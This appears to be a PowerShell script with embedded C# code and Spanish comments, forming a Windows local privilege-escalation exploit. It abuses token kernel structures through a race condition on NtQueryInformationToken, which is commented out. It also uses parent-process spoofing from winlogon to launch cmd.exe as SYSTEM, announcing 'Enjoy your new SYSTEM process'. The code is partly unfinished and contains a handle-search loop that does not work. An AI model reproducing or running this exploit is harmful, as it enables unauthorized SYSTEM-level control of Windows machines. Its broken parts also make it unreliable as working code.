$signature = @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

public class ProgramCSHARP
{
    // Constantes y definiciones
    private const uint TOKEN_ALL_ACCESS = 0xF01FF;
    private const uint MEM_COMMIT = 0x1000;
    private const uint PAGE_READWRITE = 0x04;
    private const int  PROCESS_ALL_ACCESS = 0x1F0FFF;
    private const int  PROCESS_CREATE_PROCESS = 0x0080;
    private const uint EXTENDED_STARTUPINFO_PRESENT = 0x00080000;
    private const uint CREATE_NEW_CONSOLE = 0x00000010;
    private const uint PROC_THREAD_ATTRIBUTE_PARENT_PROCESS = 0x00020000;

    public enum TOKEN_INFORMATION_CLASS
    {
        TokenUser = 1,
        TokenGroups = 2,
        TokenPrivileges = 3,
        TokenOwner = 4,
        TokenPrimaryGroup = 5,
        TokenDefaultDacl = 6,
        TokenSource = 7,
        TokenType = 8,
        TokenImpersonationLevel = 9,
        TokenStatistics = 10,
        TokenRestrictedSids = 11,
        TokenSessionId = 12,
        TokenGroupsAndPrivileges = 13,
        TokenSessionReference = 14,
        TokenSandBoxInert = 15,
        TokenAuditPolicy = 16,
        TokenOrigin = 17,
        TokenElevationType = 18,
        TokenLinkedToken = 19,
        TokenElevation = 20,
        TokenHasRestrictions = 21,
        TokenAccessInformation = 22,
        TokenVirtualizationAllowed = 23,
        TokenVirtualizationEnabled = 24,
        TokenIntegrityLevel = 25,
        TokenUIAccess = 26,
        TokenMandatoryPolicy = 27,
        TokenLogonSid = 28,
        MaxTokenInfoClass = 29
    }
    public struct SYSTEM_HANDLE
    {
        public IntPtr Object;
        public IntPtr UniqueProcessId;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTraceIndex;
        public ushort ObjectTypeIndex;
        public uint HandleAttributes;
        public uint Reserved;
    }

    public struct SYSTEM_HANDLE_INFORMATION_EX
    {
        public ulong HandleCount;
        public ulong Reserved;
        public SYSTEM_HANDLE Handles;
    }

    public enum SYSTEM_INFORMATION_CLASS
    {
        SystemExtendedHandleInformation = 64
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION
    {
        public uint SecurityAttributeCount;
        public LIST_ENTRY SecurityAttributesList;
        public uint WorkingSecurityAttributeCount;
        public LIST_ENTRY WorkingSecurityAttributesList;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct LIST_ENTRY
    {
        public IntPtr Flink;
        public IntPtr Blink;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct TOKEN_ACCESS_INFORMATION
    {
        public IntPtr SidHash;
        public IntPtr RestrictedSidHash;
        public IntPtr Privileges;
        public IntPtr AuthenticationId;
        public IntPtr TokenType;
        public IntPtr ImpersonationLevel;
        public IntPtr MandatoryPolicy;
        public IntPtr Flags;
        public IntPtr AppContainerNumber;
        public IntPtr PackageSid;
        public IntPtr Capabilities;
        public IntPtr TrustLevel;
        public IntPtr SecurityAttributes;
        public IntPtr SidHashLength;
        public IntPtr RestrictedSidHashLength;
    }

    public delegate int NtQueryInformationTokenDelegate(
        IntPtr TokenHandle,
        TOKEN_INFORMATION_CLASS TokenInformationClass,
        IntPtr TokenInformation,
        uint TokenInformationLength,
        out uint ReturnLength
    );
    public delegate int NtQuerySystemInformationDelegate(
        SYSTEM_INFORMATION_CLASS SystemInformationClass,
        IntPtr SystemInformation,
        uint SystemInformationLength,
        out uint ReturnLength
    );
    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFOEXA
    {
        public STARTUPINFOA StartupInfo;
        public IntPtr lpAttributeList;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct STARTUPINFOA
    {
        public int cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public int dwX;
        public int dwY;
        public int dwXSize;
        public int dwYSize;
        public int dwXCountChars;
        public int dwYCountChars;
        public int dwFillAttribute;
        public int dwFlags;
        public short wShowWindow;
        public short cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
    public static extern IntPtr GetModuleHandle(string lpModuleName);

    // Importaciones de las DLL necesarias
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool OpenProcessToken(IntPtr ProcessHandle, uint DesiredAccess, out IntPtr TokenHandle);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr GetCurrentProcess();

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool CloseHandle(IntPtr hObject);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, ThreadStart lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll")]
    private static extern bool SetThreadPriority(IntPtr hThread, int nPriority);

    [DllImport("kernel32.dll")]
    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr OpenProcess(int dwDesiredAccess, bool bInheritHandle, int dwProcessId);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr GetProcessHeap();

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern IntPtr HeapAlloc(IntPtr hHeap, uint dwFlags, UIntPtr dwBytes);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool InitializeProcThreadAttributeList(IntPtr lpAttributeList, int dwAttributeCount, int dwFlags, ref UIntPtr lpSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool UpdateProcThreadAttribute(IntPtr lpAttributeList, uint dwFlags, IntPtr Attribute, IntPtr lpValue, UIntPtr cbSize, IntPtr lpPreviousValue, IntPtr lpReturnSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcessA(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFOEXA lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern void DeleteProcThreadAttributeList(IntPtr lpAttributeList);

    // TODO REVISAR ERROR: GetKernelPointerByHandle() failed. Puede ser por el valor del handle o la forma de buscar
    public static IntPtr GetKernelPointerByHandle(IntPtr HandleValue)
    {
        IntPtr ntdll = GetModuleHandle("ntdll");
        IntPtr pQueryInfoToken = GetProcAddress(ntdll, "NtQuerySystemInformation");
        if (pQueryInfoToken == IntPtr.Zero)
        {
            Console.WriteLine("GetProcAddress() failed.");
            return IntPtr.Zero;
        }
        uint len = 20;
        int status = unchecked((int)0xc0000004);
        IntPtr pHandleInfo = IntPtr.Zero;
        do
        {
            len *= 2;
            pHandleInfo = Marshal.AllocHGlobal((int)len);

            NtQuerySystemInformationDelegate query = (NtQuerySystemInformationDelegate)Marshal.GetDelegateForFunctionPointer(pQueryInfoToken, typeof(NtQuerySystemInformationDelegate));
            status = query(SYSTEM_INFORMATION_CLASS.SystemExtendedHandleInformation, pHandleInfo, len, out len);

        } while (status == unchecked((int)0xc0000004));
        if (status != 0x0)
        {
            Console.WriteLine("NtQuerySystemInformation failed with error code 0x" + status.ToString("X"));
            return IntPtr.Zero;
        }

        uint CurrentPid = (uint)System.Diagnostics.Process.GetCurrentProcess().Id;
        Console.WriteLine("CurrentPid:" + CurrentPid);
        SYSTEM_HANDLE_INFORMATION_EX handleInfo = (SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(pHandleInfo, typeof(SYSTEM_HANDLE_INFORMATION_EX));
        for (ulong i = 0; i < handleInfo.HandleCount; i++)
        {
            IntPtr objectPtr = handleInfo.Handles.Object;
            IntPtr handle = handleInfo.Handles.HandleValue;
            IntPtr pid = handleInfo.Handles.UniqueProcessId;

            if ((uint)pid == CurrentPid && handle == HandleValue)
            {
                Console.WriteLine("Found object!");
                return objectPtr;
            }
        }
        return IntPtr.Zero;
    }

    public static int CreateProcessFromHandle(IntPtr Handle, string command)
    {
        STARTUPINFOEXA si = new STARTUPINFOEXA();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
        UIntPtr size = UIntPtr.Zero;
        bool ret;

        // Create our PROC_THREAD_ATTRIBUTE_PARENT_PROCESS attribute
        InitializeProcThreadAttributeList(IntPtr.Zero, 1, 0, ref size);
        si.lpAttributeList = HeapAlloc(GetProcessHeap(), 0, size);
        if (si.lpAttributeList == IntPtr.Zero)
        {
            Console.WriteLine("Error allocating memory for attribute list");
            return 1;
        }
        if (!InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, ref size))
        {
            Console.WriteLine("Error initializing attribute list");
            return 2;
        }

        if (!UpdateProcThreadAttribute(si.lpAttributeList, 0, (IntPtr)PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, Handle, (UIntPtr)Marshal.SizeOf(Handle), IntPtr.Zero, IntPtr.Zero))
        {
            Console.WriteLine("Error updating attribute list");
            return 3;
        }

        si.StartupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFOEXA));

        // Finally, create the process
        ret = CreateProcessA(
            null,
            command,
            IntPtr.Zero,
            IntPtr.Zero,
            true,
            EXTENDED_STARTUPINFO_PRESENT | CREATE_NEW_CONSOLE,
            IntPtr.Zero,
            null,
            ref si,
            out pi
        );

        // Clean up the attribute list
        DeleteProcThreadAttributeList(si.lpAttributeList);

        if (!ret)
        {
            Console.WriteLine("Error creating new process ({0})", Marshal.GetLastWin32Error());
            return 4;
        }

        Console.WriteLine("Enjoy your new SYSTEM process");
        return 0;
    }

    // Variables globales
    private static IntPtr hToken;
    private static IntPtr kTokenAddr = IntPtr.Zero;
    private static IntPtr tokenInfo = IntPtr.Zero;
    private static NtQueryInformationTokenDelegate NtQueryInformationToken = null;
    private static uint Infolen = 0x1000;
    private static uint returnLength = 0;
    // private static long OffsetToName = 0;
    private static IntPtr RaceAddr = IntPtr.Zero;
    static void RaceThread()
    {
        long value = kTokenAddr.ToInt64() + 0x40 - 4;
        for (int i = 0; i < 0x10000; i++)
        {
            Marshal.WriteInt16(RaceAddr + 2, 2);
            Marshal.WriteInt64(RaceAddr + 8, value);
        }
    }

    public static int Main(string[] args)
    {
        // Inicializar la función NtQuerySystemInformation
        IntPtr ntdll = GetModuleHandle("ntdll.dll");
        IntPtr pQueryInfoToken = GetProcAddress(ntdll, "NtQueryInformationToken");
        NtQueryInformationToken = (NtQueryInformationTokenDelegate)Marshal.GetDelegateForFunctionPointer(pQueryInfoToken, typeof(NtQueryInformationTokenDelegate));

        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ALL_ACCESS, out hToken))
        {
            Console.WriteLine("OpenProcessToken() failed.");
            Environment.Exit(1);
        }
        // Print as two-digits hexadecimal 
        byte hTokenByte = (byte)hToken.ToInt32();
        string hTokenHex = hTokenByte.ToString("X2");
        Console.WriteLine("hToken: " + hTokenHex);

        /* kTokenAddr = GetKernelPointerByHandle(hToken);
        if (kTokenAddr == IntPtr.Zero)
        {
            Console.WriteLine("GetKernelPointerByHandle() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("kTokenAddr: " + kTokenAddr.ToString("X")); */

        tokenInfo = VirtualAlloc(IntPtr.Zero, Infolen, MEM_COMMIT, PAGE_READWRITE);

        if (tokenInfo == IntPtr.Zero)
        {
            Console.WriteLine("VirtualAlloc() failed.");
            Environment.Exit(1);
        }

        int status = NtQueryInformationToken(hToken, (TOKEN_INFORMATION_CLASS)22, tokenInfo, Infolen, out returnLength);
        Console.WriteLine("status: " + status);
        Console.WriteLine("returnLength: " + returnLength);
        /*
        if (status == 0)
        {
            TOKEN_ACCESS_INFORMATION tokenAccessInformation = (TOKEN_ACCESS_INFORMATION)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_ACCESS_INFORMATION));
            AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION securityAttributes = (AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION)Marshal.PtrToStructure(tokenAccessInformation.SecurityAttributes, typeof(AUTHZBASEP_SECURITY_ATTRIBUTES_INFORMATION));

            Console.WriteLine("securityAttributes.SecurityAttributeCount: " + securityAttributes.SecurityAttributeCount);

            if (securityAttributes.SecurityAttributeCount > 0)
            {
                IntPtr FlinkPtr = securityAttributes.SecurityAttributesList.Flink;

                Console.WriteLine("FlinkPtr: " + FlinkPtr);
                // TODO FLINK ZERO
                if (FlinkPtr != IntPtr.Zero)
                {
                    Console.WriteLine("Flink: " + FlinkPtr + ", tokenInfo: " + tokenInfo);
                    OffsetToName = FlinkPtr.ToInt64() + 0x20 - tokenInfo.ToInt64();
                    Console.WriteLine("Found target offset value: 0x" + OffsetToName.ToString("X"));
                }
            }
        }

        if (OffsetToName == 0)
        {
            Console.WriteLine("Target offset search failed. ");
            Environment.Exit(1);
        }

        RaceAddr = new IntPtr(tokenInfo.ToInt64() + OffsetToName);
        Console.WriteLine("Target address: 0x" + RaceAddr.ToString("X")); */

        IntPtr hWinLogon = IntPtr.Zero;

        int pid = GetPidByName("winlogon");

        if (pid == 0)
        {
            Console.WriteLine("GetPidByName() failed.");
            Environment.Exit(1);
        }

        Console.WriteLine("PID: " + pid);

        return pid;

        /*
        for (int i = 0; i < 5000; i++)
        {
            uint threadId;
            IntPtr h = CreateThread(IntPtr.Zero, 0, new ThreadStart(RaceThread), IntPtr.Zero, 0, out threadId);
            SetThreadPriority(h, 2); // THREAD_PRIORITY_TIME_CRITICAL

             for (int i = 0; i < 5000; i++)
            {
                NtQueryInformationToken(hToken, (TOKEN_INFORMATION_CLASS)22, tokenInfo, Infolen, out returnLength);
            }

            WaitForSingleObject(h, 0xFFFFFFFF); // INFINITE

            hWinLogon = OpenProcess(PROCESS_ALL_ACCESS, false, pid);
            if (hWinLogon != IntPtr.Zero) {
                break;
            } else {
                int error = Marshal.GetLastWin32Error();
                Console.WriteLine("No se pudo obtener el handle del proceso. Error: " + error);
            }
        }

        byte hWinLogonByte = (byte)hWinLogon.ToInt32();
        string hWinLogonHex = hWinLogonByte.ToString("X2");
        Console.WriteLine("Got Winlogon handle: 0x" + hWinLogonHex);

        CreateProcessFromHandle(hWinLogon, "C:\\Windows\\system32\\cmd.exe");

        CloseHandle(hWinLogon);
        CloseHandle(hToken);*/
    }

    private static int GetPidByName(string procName)
    {
        Process[] processes = Process.GetProcessesByName(procName);

        if (processes.Length > 0)
        {
            Process process = processes[0];
            return process.Id;
        }

        return 0;
    }
}
"@

Add-Type -TypeDefinition $signature -Language CSharp

$pidddd = [ProgramCSHARP]::Main(@())
$process = [System.Diagnostics.Process]::GetProcessById($pidddd)
$handle = $process.Handle
Write-Output "Handle del proceso: $handle"
[ProgramCSHARP]::CreateProcessFromHandle($handle, "C:\\Windows\\system32\\cmd.exe")